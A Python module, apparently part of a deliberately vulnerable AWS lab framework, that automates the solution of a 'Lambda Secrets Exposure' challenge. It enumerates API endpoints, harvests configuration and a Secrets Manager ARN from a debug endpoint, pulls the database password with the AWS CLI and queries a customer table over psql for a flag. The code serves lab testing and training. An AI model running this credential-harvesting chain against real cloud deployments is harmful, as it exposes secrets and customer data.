import json
import subprocess
import requests
from vault.attacks.base import BaseAttackChain, AttackResult
from vault.attacks import register_attack

@register_attack("aws", "lambda-secrets-exposure")
class LambdaSecretsExposure(BaseAttackChain):
    """
    Attack chain for Lambda Function Secrets Exposure lab
    
    Chain: API Gateway → Lambda env vars → Secrets Manager → RDS
    """
    
    def __init__(self, outputs: dict, verbose: bool = False, log_file: str | None = None):
        super().__init__(outputs, verbose, log_file)
        self.api_endpoint = outputs.get('api_endpoint')
        self.secret_arn = None
        self.db_credentials = None
        self.db_host = outputs.get('db_endpoint')
        self.db_name = outputs.get('db_name', 'production')
    
    def run(self) -> list[AttackResult]:
        """Execute full attack chain"""
        results = []
        
        results.append(self._enumerate_api())
        
        if results[-1].success:
            results.append(self._extract_configuration())
        
        if results[-1].success and self.secret_arn:
            results.append(self._retrieve_secrets())
        
        if results[-1].success and self.db_credentials:
            results.append(self._access_database())
        
        if results[-1].success:
            results.append(self._extract_flag())
        
        return results
    
    def _enumerate_api(self) -> AttackResult:
        """Phase 1: Enumerate API Gateway endpoints"""
        try:
            if not self.api_endpoint:
                return AttackResult(
                    phase="API Enumeration",
                    success=False,
                    message="No API endpoint in outputs"
                )
            
            self.log_verbose(f"Testing API endpoint: {self.api_endpoint}")
            
            endpoints = ['/health', '/status', '/db-test']
            found = []
            
            for endpoint in endpoints:
                url = f"{self.api_endpoint}{endpoint}"
                try:
                    resp = requests.get(url, timeout=10)
                    if resp.status_code == 200:
                        found.append(endpoint)
                        self.log_verbose(f"Found endpoint: {endpoint} (HTTP {resp.status_code})")
                except Exception as e:
                    self.log_verbose(f"Endpoint {endpoint} failed: {str(e)}")
            
            if found:
                return AttackResult(
                    phase="API Enumeration",
                    success=True,
                    message=f"Discovered {len(found)} endpoints",
                    details={'endpoints': found}
                )
            else:
                return AttackResult(
                    phase="API Enumeration",
                    success=False,
                    message="No accessible endpoints found"
                )
        
        except Exception as e:
            return AttackResult(
                phase="API Enumeration",
                success=False,
                message=f"Error: {str(e)}"
            )
    
    def _extract_configuration(self) -> AttackResult:
        """Phase 2: Extract Lambda configuration from debug mode"""
        try:
            status_url = f"{self.api_endpoint}/status"
            self.log_verbose(f"Requesting: {status_url}")
            
            resp = requests.get(status_url, timeout=10)
            
            if resp.status_code != 200:
                return AttackResult(
                    phase="Configuration Extraction",
                    success=False,
                    message=f"Status endpoint returned {resp.status_code}"
                )
            
            data = resp.json()
            self.log_verbose("Response data:", json.dumps(data, indent=2))
            
            if 'configuration' in data:
                config = data['configuration']
                self.secret_arn = config.get('secret_arn')
                
                details = {
                    'secret_arn': self.secret_arn,
                    'db_host': config.get('db_host'),
                    'db_name': config.get('db_name'),
                    'api_key': config.get('api_key'),
                    'debug_mode': True
                }
                
                return AttackResult(
                    phase="Configuration Extraction",
                    success=True,
                    message="Debug mode exposed Lambda configuration",
                    details=details
                )
            else:
                return AttackResult(
                    phase="Configuration Extraction",
                    success=False,
                    message="No configuration data in response",
                    details={'response': data}
                )
        
        except Exception as e:
            return AttackResult(
                phase="Configuration Extraction",
                success=False,
                message=f"Error: {str(e)}"
            )
    
    def _retrieve_secrets(self) -> AttackResult:
        """Phase 3: Retrieve database credentials via Lambda"""
        try:
            db_test_url = f"{self.api_endpoint}/db-test"
            self.log_verbose(f"Requesting: {db_test_url}")
            
            resp = requests.get(db_test_url, timeout=30)
            
            if resp.status_code != 200:
                return AttackResult(
                    phase="Secrets Retrieval",
                    success=False,
                    message=f"db-test endpoint returned {resp.status_code}",
                    details={'response': resp.text}
                )
            
            data = resp.json()
            self.log_verbose("Secrets response:", json.dumps(data, indent=2))
            
            if 'db_host' in data and 'db_user' in data:
                self.db_credentials = {
                    'host': data.get('db_host'),
                    'database': data.get('db_name'),
                    'user': data.get('db_user')
                }
                
                return AttackResult(
                    phase="Secrets Retrieval",
                    success=True,
                    message="Retrieved database credentials via Lambda",
                    details={'credentials': self.db_credentials}
                )
            else:
                return AttackResult(
                    phase="Secrets Retrieval",
                    success=False,
                    message="No credentials in Lambda response",
                    details={'response': data}
                )
        
        except Exception as e:
            return AttackResult(
                phase="Secrets Retrieval",
                success=False,
                message=f"Error: {str(e)}"
            )
    
    def _access_database(self) -> AttackResult:
        """Phase 4: Connect to RDS database"""
        try:
            # Get password from Secrets Manager via AWS CLI
            self.log_verbose(f"Retrieving password from Secrets Manager: {self.secret_arn}")
            
            cmd = [
                'aws', 'secretsmanager', 'get-secret-value',
                '--secret-id', self.secret_arn,
                '--query', 'SecretString',
                '--output', 'text'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode != 0:
                return AttackResult(
                    phase="Database Connection",
                    success=False,
                    message="Failed to retrieve secret from Secrets Manager",
                    details={'error': result.stderr}
                )
            
            secret_data = json.loads(result.stdout)
            password = secret_data.get('password')
            
            if not password:
                return AttackResult(
                    phase="Database Connection",
                    success=False,
                    message="No password in secret"
                )
            
            # Test database connection
            test_cmd = [
                'psql',
                f"postgresql://admin:{password}@{self.db_host}/{self.db_name}",
                '-c', 'SELECT version();'
            ]
            
            self.log_verbose(f"Testing database connection to {self.db_host}")
            
            result = subprocess.run(test_cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                self.db_credentials['password'] = password
                return AttackResult(
                    phase="Database Connection",
                    success=True,
                    message="Successfully connected to RDS database",
                    details={'db_version': result.stdout.strip()}
                )
            else:
                return AttackResult(
                    phase="Database Connection",
                    success=False,
                    message="Database connection failed",
                    details={'error': result.stderr}
                )
        
        except subprocess.TimeoutExpired:
            return AttackResult(
                phase="Database Connection",
                success=False,
                message="Database connection timeout"
            )
        except Exception as e:
            return AttackResult(
                phase="Database Connection",
                success=False,
                message=f"Error: {str(e)}"
            )
    
    def _extract_flag(self) -> AttackResult:
        """Phase 5: Extract flag from customer_records table"""
        try:
            password = self.db_credentials.get('password')
            
            query = "SELECT customer_name, email, api_key FROM customer_records WHERE api_key LIKE 'FLAG%';"
            
            cmd = [
                'psql',
                f"postgresql://admin:{password}@{self.db_host}/{self.db_name}",
                '-c', query
            ]
            
            self.log_verbose("Querying customer_records table for flag")
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            if result.returncode == 0:
                output = result.stdout.strip()
                
                flag = None
                for line in output.split('\n'):
                    if 'FLAG{' in line:
                        parts = line.split('|')
                        if len(parts) >= 3:
                            flag = parts[2].strip()
                            break
                
                if flag:
                    return AttackResult(
                        phase="Flag Extraction",
                        success=True,
                        message=f"Retrieved flag: {flag}",
                        details={'flag': flag, 'table': 'customer_records'}
                    )
                else:
                    return AttackResult(
                        phase="Flag Extraction",
                        success=False,
                        message="No flag found in query results",
                        details={'output': output}
                    )
            else:
                return AttackResult(
                    phase="Flag Extraction",
                    success=False,
                    message="Query failed",
                    details={'error': result.stderr}
                )
        
        except Exception as e:
            return AttackResult(
                phase="Flag Extraction",
                success=False,
                message=f"Error: {str(e)}"
            )